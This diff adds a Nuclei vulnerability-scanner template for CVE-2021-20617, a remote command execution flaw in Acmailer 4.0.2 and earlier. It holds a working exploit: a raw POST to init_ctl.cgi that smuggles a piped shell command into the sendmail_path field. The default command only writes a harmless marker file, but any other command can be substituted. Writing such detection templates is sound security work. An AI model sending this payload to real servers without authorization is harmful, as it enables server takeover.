@@ -1,0 +1,32 @@
+id: CVE-2021-20617
+
+info:
+  name: Acmailer init_ctl.cgi Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-execution, cgi
+  reference:
+    - https://www.acmailer.jp/
+  description: |
+    Acmailer 4.0.2 and earlier versions have a security vulnerability. The vulnerability is due to the fact that init_ctl.cgi does not strictly verify input parameters, and attackers can execute arbitrary commands to obtain server permissions.
+
+variables:
+  cmd: "echo 'nuclei-test' > /tmp/nuclei-test.txt"
+
+http:
+  - raw:
+      - |
+        POST /init_ctl.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|{{cmd}}|%20bash&homeurl=http%%3A%%2F%%2F&mypath=e
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "nuclei-test"
+        part: body
